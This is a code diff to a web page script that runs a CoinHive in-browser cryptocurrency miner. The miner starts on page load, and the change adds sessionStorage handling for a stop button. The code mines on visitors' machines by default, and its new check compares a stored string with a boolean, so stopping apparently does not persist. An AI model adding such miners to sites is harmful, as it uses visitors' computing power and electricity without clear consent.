@@ -50,7 +50,11 @@ var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log'
 
 // Only start on non-mobile devices
 if (typeof miner !== 'undefined') {
-    startMine();
+    if (window.sessionStorage["minerStarted"] != false)
+        startMine();
+    window.sessionStorage["minerStarted"] = miner.isRunning();
+    if (document.getElementById('stop_mine'))
+        document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
 }
 
 
@@ -65,7 +69,7 @@ function stopMine() {
     if (typeof miner !== 'undefined' && miner.isRunning()) {
         miner.stop();
         document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
-    } 
+    }
     else {
         startMine();
     }
